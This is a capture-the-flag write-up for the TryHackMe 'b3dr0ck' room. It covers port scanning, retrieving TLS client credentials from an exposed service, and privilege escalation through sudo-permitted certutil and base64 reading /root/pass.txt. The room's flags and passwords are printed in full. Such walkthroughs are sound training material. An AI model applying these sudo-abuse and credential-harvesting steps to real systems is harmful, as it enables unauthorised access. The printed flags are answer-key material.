## b3dr0ck - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/b3dr0ck)

<i>Fred Flintstone & Barney Rubble!

Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
Can you find all the Easter eggs?

Please allow an extra few minutes for the VM to fully startup﻿.</i>

**IP: 10.10.123.173**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan.

  ```
  nmap -sC -sV -T5 -p- 10.10.123.173

  PORT      STATE SERVICE      VERSION
  22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
  |   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
  |_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
  80/tcp    open  http         nginx 1.18.0 (Ubuntu)
  |_http-title: Did not follow redirect to https://10.10.123.173:4040/
  |_http-server-header: nginx/1.18.0 (Ubuntu)
  4040/tcp  open  ssl/yo-main?
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn: 
  |_  http/1.1
  | ssl-cert: Subject: commonName=localhost
  | Not valid before: 2025-05-30T19:53:59
  |_Not valid after:  2026-05-30T19:53:59
  | fingerprint-strings: 
  |   GetRequest: 
  |     HTTP/1.1 200 OK
  |     Content-type: text/html
  |     Date: Fri, 30 May 2025 20:00:36 GMT
  |     Connection: close
  |     <!DOCTYPE html>
  |     <html>
  |     <head>
  |     <title>ABC</title>
  |     <style>
  |     body {
  |     width: 35em;
  |     margin: 0 auto;
  |     font-family: Tahoma, Verdana, Arial, sans-serif;
  |     </style>
  |     </head>
  |     <body>
  |     <h1>Welcome to ABC!</h1>
  |     <p>Abbadabba Broadcasting Compandy</p>
  |     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
  |     <p>Barney is helping to setup the server, and he said this info was important...</p>
  |     <pre>
  |     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
  |     Bamm Bamm tried to setup a sql database, but I don't see it running.
  |     Looks like it started something else, but I'm not sure how to turn it off...
  |     said it was from the toilet and OVER 9000!
  |     Need to try and secure
  |   HTTPOptions: 
  |     HTTP/1.1 200 OK
  |     Content-type: text/html
  |     Date: Fri, 30 May 2025 20:00:37 GMT
  |     Connection: close
  |     <!DOCTYPE html>
  |     <html>
  |     <head>
  |     <title>ABC</title>
  |     <style>
  |     body {
  |     width: 35em;
  |     margin: 0 auto;
  |     font-family: Tahoma, Verdana, Arial, sans-serif;
  |     </style>
  |     </head>
  |     <body>
  |     <h1>Welcome to ABC!</h1>
  |     <p>Abbadabba Broadcasting Compandy</p>
  |     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
  |     <p>Barney is helping to setup the server, and he said this info was important...</p>
  |     <pre>
  |     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
  |     Bamm Bamm tried to setup a sql database, but I don't see it running.
  |     Looks like it started something else, but I'm not sure how to turn it off...
  |     said it was from the toilet and OVER 9000!
  |_    Need to try and secure
  9009/tcp  open  pichat?
  | fingerprint-strings: 
  |   NULL: 
  |     ____ _____ 
  |     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
  |     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
  |     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
  |     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
  |     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
  |_    What are you looking for?
  54321/tcp open  ssl/unknown
  | ssl-cert: Subject: commonName=localhost
  | Not valid before: 2025-05-30T19:53:59
  |_Not valid after:  2026-05-30T19:53:59
  |_ssl-date: TLS randomness does not represent time
  | fingerprint-strings: 
  |   FourOhFourRequest, GetRequest, HTTPOptions, Kerberos, TLSSessionReq, TerminalServer: 
  |_    Error: 'undefined' is not authorized for access.
  ```
  
- When you visit port 4040 you'll see this message:

  ```
  Welcome to ABC!

  Abbadabba Broadcasting Compandy
  
  We're in the process of building a website! Can you believe this technology exists in bedrock?!?
  
  Barney is helping to setup the server, and he said this info was important...
  
  Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
  Bamm Bamm tried to setup a sql database, but I don't see it running.
  Looks like it started something else, but I'm not sure how to turn it off...
  
  He said it was from the toilet and OVER 9000!
  
  Need to try and secure connections with certificates...
  ```
  
- Since there was nothing else, I used netcat to connect to port 9009. Well, there you can extract Barney's certificate and private key.

  ```
  nc -v 10.10.123.173 9009
  10.10.123.173: inverse host lookup failed: Unknown host
  (UNKNOWN) [10.10.123.173] 9009 (?) open
  
  
   __          __  _                            _                   ____   _____ 
   \ \        / / | |                          | |            /\   |  _ \ / ____|
    \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
     \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
      \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
       \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                                 
                                                                                 
  
  
  What are you looking for? flag
  Sorry, unrecognized request: 'flag'
  
  You use this service to recover your client certificate and private key
  What are you looking for? private key
  Sounds like you forgot your private key. Let's find it for you...
  
  -----BEGIN RSA PRIVATE KEY-----
  [SNIP!]
  -----END RSA PRIVATE KEY-----
  
  
  What are you looking for? certificate
  Sounds like you forgot your certificate. Let's find it for you...
  
  -----BEGIN CERTIFICATE-----
  [SNIP!]
  -----END CERTIFICATE-----
  ```

- Save both certificate and key and use them to connect to port 54321 with OpenSSL since it is allowed. Then you can find Barney's password.

  ```
  openssl s_client -connect 10.10.123.173:54321 -cert certificate -key id_rsa

  [SNIP!]
      Start Time: 1748635794
      Timeout   : 7200 (sec)
      Verify return code: 18 (self-signed certificate)
      Extended master secret: no
      Max Early Data: 0
  ---
  read R BLOCK
  Welcome: 'Barney Rubble' is authorized.
  b3dr0ck> 
  
  b3dr0ck> ls -al
  Unrecognized command: 'ls -al'
  
  This service is for login and password hints
  b3dr0ck> password
  Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
  b3dr0ck> login
  Login is disabled. Please use SSH instead.
  ```

- Well, I tried cracking this MD5 hash with few tools but nothing worked. So I tried connecting with SSH with that hash and VOILA!

  ```
  ssh barney@10.10.123.173                       

  barney@10.10.123.173's password: 
  barney@b3dr0ck:~$ whoami
  barney
  barney@b3dr0ck:~$ id
  uid=1001(barney) gid=1001(barney) groups=1001(barney)
  ```
  
---

## 🧍 User Privilege Escalation

- OK, so first flag is already there. For the second and third flag we will need to escalate to Fred and then root.

  ```
  barney@b3dr0ck:~$ pwd
  /home/barney
  
  barney@b3dr0ck:~$ ls -al
  total 28
  drwxr-xr-x 3 barney barney 4096 Apr 30  2022 .
  drwxr-xr-x 4 root   root   4096 Apr 10  2022 ..
  -rw------- 1 barney barney   38 Apr 29  2022 barney.txt
  lrwxrwxrwx 1 barney barney    9 Apr 28  2022 .bash_history -> /dev/null
  -rw-r--r-- 1 barney barney  220 Apr 10  2022 .bash_logout
  -rw-r--r-- 1 barney barney 3771 Apr 10  2022 .bashrc
  drwx------ 2 barney barney 4096 Apr 30  2022 .cache
  -rw-r--r-- 1 root   root      0 Apr 30  2022 .hushlogin
  -rw-r--r-- 1 barney barney  807 Apr 10  2022 .profile
  lrwxrwxrwx 1 root   root      9 Apr 29  2022 .viminfo -> /dev/null
  
  barney@b3dr0ck:~$ cat barney.txt 
  THM{f05780f08f0eb1de65023069d0e4c90c}
  ```
  
- When I ran `sudo -l` as Barney, I found gold.

  ```
  barney@b3dr0ck:/home/fred$ sudo -l
  [sudo] password for barney: 
  Matching Defaults entries for barney on b3dr0ck:
      insults, env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User barney may run the following commands on b3dr0ck:
      (ALL : ALL) /usr/bin/certutil
  
  barney@b3dr0ck:/home/fred$ cd /usr/bin/
  
  barney@b3dr0ck:/usr/bin$ ./certutil 
  
  Cert Tool Usage:
  ----------------
  
  Show current certs:
    certutil ls
  
  Generate new keypair:
    certutil [username] [fullname]
  
  barney@b3dr0ck:/usr/bin$ certutil ls
  
  Current Cert List: (/usr/share/abc/certs)
  ------------------
  total 56
  drwxrwxr-x 2 root root 4096 Apr 30  2022 .
  drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
  -rw-r----- 1 root root  972 May 30 19:53 barney.certificate.pem
  -rw-r----- 1 root root 1674 May 30 19:53 barney.clientKey.pem
  -rw-r----- 1 root root  894 May 30 19:53 barney.csr.pem
  -rw-r----- 1 root root 1678 May 30 19:53 barney.serviceKey.pem
  -rw-r----- 1 root root  976 May 30 19:53 fred.certificate.pem
  -rw-r----- 1 root root 1678 May 30 19:53 fred.clientKey.pem
  -rw-r----- 1 root root  898 May 30 19:53 fred.csr.pem
  -rw-r----- 1 root root 1678 May 30 19:53 fred.serviceKey.pem
  ```
  
- OK, so we have all certs here, but when I tried to overwrite Fred's cert.... well...

  ```
  barney@b3dr0ck:/usr/bin$ ./certutil fred Fred Flintston
  +----------------------------------------------------------------------------------------------------+
  |oooooooooooooooooooooo+++++++++++++++ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo|
  |oooooooooooooooo++~~..~~~::::~:~~~~~~..~:++ooooooooooooooooooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooooooo+~. .::+++++oo+oooooo+++oo+.    .~:+++ooooooooooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooooo+..:+oo++~....:+++++++oooooo+~~~~~:~       :ooooooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooo: .+o+:.  ~::+++o++++++++++++++ooooo+~..  ...  :ooooooooooooooooooooooooooooooooooooooooooo|
  |ooooooo+ ~oo:   .++:~..~~...~+ooo+ooo+oooo+..~+++o+   .:+ooooooooooooooooooooooooooooooooooooooooooo|
  |oooooo~ ++.   ~+o+ .+oooooo+: ~oooooooooo. :ooooo:   :: oooooooooooooooooooooooooooooooooooooooooooo|
  |ooooo. o+:+++ooo. +oooooooooo+ ~oooooooo. ooooooo++:+o+ +ooooooooooooooooooooooooooooooooooooooooooo|
  |oooo+ +oooooooo+ +o++:++oooooo~ oooooooo +oooooooooooo  :ooooooooooooooooooooooooooooooooooooooooooo|
  |oooo. ooooooo++~ oo     +ooooo. oooooooo  +ooooooooo+..~ +oooooooooooooooooooooooooooooooooooooooooo|
  |ooo+ +ooooo++++. .+~..:+ooooo+ +ooooooooo~..~~......  :+ +oooooooooooooooooooooooooooooooooooooooooo|
  |ooo~ ooooooooo++++.~~:+++++: .+ooooooooooooo+  :+oooo+:  ~oooooooooooooooooooooooooooooooooooooooooo|
  |ooo..ooooooooo+oooo++:~~~.~~+ooooooooooo++:. :oo:~.~~:oo+ .+oooooooooooooooooooooooooooooooooooooooo|
  |ooo :oooooooooooooooooooooooooo++:::::::::  +o:  ++++: +oo .oooooooooooooooooooooooooooooooooooooooo|
  |ooo +ooooooooooooooooooooooo+++++++++++oo. +o~ ~ ~+.:~  +o: oooooooooooooooooooooooooooooooooooooooo|
  |ooo +ooooooooooooooooooooooo++:++++++++o. :o+ ~+ +: : : ~o: oooooooooooooooooooooooooooooooooooooooo|
  |ooo +oooooooooooooooooooooooooo++o++++oo  oo: +++++++++. o. oooooooooooooooooooooooooooooooooooooooo|
  |ooo .ooooooooooooooooooooooo+++++++++++o: +o~ ooooooooo .+ +oooo+.+ooooooooo+:~....:+oooo:.+oooooooo|
  |ooo+ +o+ooo+ooooooooooooooooooooooooooooo .o: +ooooooo: o. ooooo~ :oooooooo+. ~:++:. .+oo. .oooooooo|
  |oooo ~o+:oo+oo++ooooooooooooooooooooooooo. o: ooooooo+ ++ +ooooo~ :ooooooo+. :oooooo. .oo...oooooooo|
  |oooo+ +o++o++oo++oooooooooooooooooooooooo. o: ooooooo .o~ oooooo~ :ooooooo+  +oooooo: .oo. ~oooooooo|
  |ooooo .oo+:+:+oo+++oooooo++++oooooooooooo. o. oooooo+ :o: +ooooo~ :ooooooo+  :oooooo. .oo. ~oooooooo|
  |ooooo+ :oo+::+oooo++ooooooo+++:+++ooooooo .o ~oooooo+ :oo ~ooooo~ ~+++++++o+. ~++++. .+oo. .++++++oo|
  |oooooo: +ooo::+oooo++ooooooo++++++++oooo: o+ ~++++ooo. oo~ ooooo+........+oo+:~....~++ooo:........oo|
  |ooooooo. ooo+::+ooo++ooooooooo+++++++oo+ :o. o+++:::o+ +o+ ooooooooooooooooooooooooooooooooooooooooo|
  |oooooooo  ooo++++ooo++ooooo++++oo++++oo. oo ~oooooo+.+ .o+ ooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooo .oo+++++ooo+++ooo+++:::+++++o :oo .:~::~~~~. :o+ ooooooooooooooooooooooooooooooooooooooooo|
  |oooooooooo  ooo++:++ooo+++ooooooo+:~+oo +oo .+ ~: + o~ oo: ooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooooo. +oo+++++++oo+++ooooooo+:~~ +oo~ ~++:~+   +oo .ooooooooooooooooooooooooooooooooooooooooo|
  |oooooooooooo: ~+oo++++++++o+++oooooooo~ .ooo~ ~:++:. +oo~ +ooooooooooooooooooooooooooooooooooooooooo|
  |oooooooooooooo: .+oooo+++::+++ooooooooo+ :oooo+::~:+oo+. +oooooooooooooooooooooooooooooooooooooooooo|
  |oooooooooooooooo+~..:+oooo+++:::::++++++:. ~++ooooo+:~ :oooooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooooooooooooo+:...~++ooooo+++++++++o+:~~.    .:+oooooooooooooooooooooooooooooooooooooooooooooo|
  |oooooooooooooooooooooo++:....~:+ooooooooo++++:..:+oooooooooooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooooooooooooooooooooo++:~...:+++++:  .::+ooooooooooooooooooooooooooooooooooooooooooooooooooooo|
  |ooooooooooooooooooooooooooooooooo+::~~~~:+oooooooooooooooooooooooooooooooooooooooooooooooooooooooooo|
  |oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo|
  +----------------------------------------------------------------------------------------------------+
  
  
  EPIC FAIL: wut am i supposed to do with: fred Fred Flintston?
  
  Cert Tool Usage:
  ----------------
  
  Show current certs:
    certutil ls
  
  Generate new keypair:
    certutil [username] [fullname]
  ```

- AHHAHAHAHAHAHAHHAHAHAHAHAHAHA THANK YOU F11snipe I LOVE YOU SO MUCH 👑

- Since that didn't work, I tried reading these certs from different directory and got Fred's cert and key.

  ```
  barney@b3dr0ck:/usr/share/abc$ ls -al
  total 32
  drwxrwxr-x   8 root root 4096 Apr 29  2022 .
  drwxr-xr-x 119 root root 4096 Apr 10  2022 ..
  drwxrwxr-x   2 root root 4096 Apr 29  2022 art
  drwxrwxr-x   2 root root 4096 Apr 29  2022 bin
  drwxrwxr-x   2 root root 4096 Apr 30  2022 certs
  drwxrwxr-x   2 root root 4096 Apr 30  2022 dist
  drwxrwxr-x  18 root root 4096 Apr 10  2022 node_modules
  drwxrwxr-x   2 root root 4096 Apr 10  2022 public
  
  barney@b3dr0ck:/usr/share/abc/certs$ sudo certutil -a fred.csr.pem 
  Generating credentials for user: a (fredcsrpem)
  Generated: clientKey for a: /usr/share/abc/certs/a.clientKey.pem
  Generated: certificate for a: /usr/share/abc/certs/a.certificate.pem
  -----BEGIN RSA PRIVATE KEY-----
  [SNIP!]
  -----END RSA PRIVATE KEY-----
  -----BEGIN CERTIFICATE-----
  [SNIP!]
  -----END CERTIFICATE-----
  ```

- Now save them and use them to connect with SSL and get Fred's password. Exactly the same process like we did for Barney.

  ```
  socat stdio ssl:10.10.123.173:54321,cert=fred_cert,key=fred_id,verify=0
  2025/05/30 21:33:09 socat[161859] W refusing to set empty SNI host name
  
  
   __     __   _     _             _____        _     _             _____        _ 
   \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
    \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
     \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
      | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
      |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                   
                                                                                   
  
  Welcome: 'fredcsrpem' is authorized.
  b3dr0ck> ls
  Unrecognized command: 'ls'
  
  This service is for login and password hints
  b3dr0ck> password
  Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
  b3dr0ck> login
  Login is disabled. Please use SSH instead.
  ```

- You already know the drill, just read the flag and move to root escalation.

  ```
  barney@b3dr0ck:/usr/share/abc/certs$ cd /home/fred
  barney@b3dr0ck:/home/fred$ su fred
  Password: 
  fred@b3dr0ck:~$ cat fred.txt 
  THM{08da34e619da839b154521da7323559d}
  ```

---

## 👑 Root Privilege Escalation

- This one is pretty straightforward, it abuses Base64 and Base32 encoding.

  ```
  fred@b3dr0ck:~$ sudo -l
  Matching Defaults entries for fred on b3dr0ck:
      insults, env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User fred may run the following commands on b3dr0ck:
      (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
      (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
  ```
  
- You can find the exploit on GTFOBins. Use the exploit to read roots password, decode it and then crack the hash.

  ```
  fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode
  LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
  
  $ echo 'LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK' | base32 -d
  YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK
                                                                                                                       
  $ echo 'YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK' | base64 -d               
  a00a12aad6b7c16bf07032bd05a31d56
  
  a00a12aad6b7c16bf07032bd05a31d56 -> MD5 -> flintstonesvitamins
  ```
  
- Switch to root, read the root flag and finish the job. Bye! 💋

---

## 🏁 Flags

- **Barney Flag**: `THM{f05780f08f0eb1de65023069d0e4c90c}`
- **Fred Password**: `YabbaDabbaD0000!`
- **Fred Flag**: `THM{08da34e619da839b154521da7323559d}`
- **Root Flag**: `THM{de4043c009214b56279982bf10a661b7}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing, just polishing my skills.`

- What did I learn?
  `Few new things about certutil.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
